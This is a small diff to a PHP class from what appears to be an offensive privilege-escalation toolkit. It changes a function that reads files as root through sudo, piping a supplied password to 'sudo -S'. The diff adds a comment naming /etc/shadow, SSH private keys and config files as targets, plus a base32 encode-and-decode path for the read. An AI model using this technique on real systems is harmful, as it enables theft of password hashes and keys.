@@ -1860,6 +1860,13 @@ L’espace noyau allant de 0xC0000000 à 0xFFFFFFFF ");
 	public function elf4root2read($sudo,$userpass,$file2read){
 	    $this->ssTitre(__FUNCTION__);
 	    $file2read = trim($file2read);
+	    /*
+	     READING: 
+	     /etc/shadow
+	     /.ssh/id_rsa
+	     config files 
+	     php files 
+	     */
 
 	    if (!empty($userpass)) $via_sudo = "echo '$userpass' | sudo -S ";
 	    else $via_sudo = "sudo ";
@@ -1876,9 +1883,13 @@ L’espace noyau allant de 0xC0000000 à 0xFFFFFFFF ");
 	            $opt_after = "";
 	            break ;
 	            
+	        case "base32":
+	            $opt_before = "$this->file_path $file2read";
+	            $opt_after = " | base32 --decode";
+	            break ;
 	            
 	        case "base64":
-	            $opt_before = "";
+	            $opt_before = "$this->file_path $file2read";
 	            $opt_after = " | base64 --decode";
 	            break ;
 	            	            
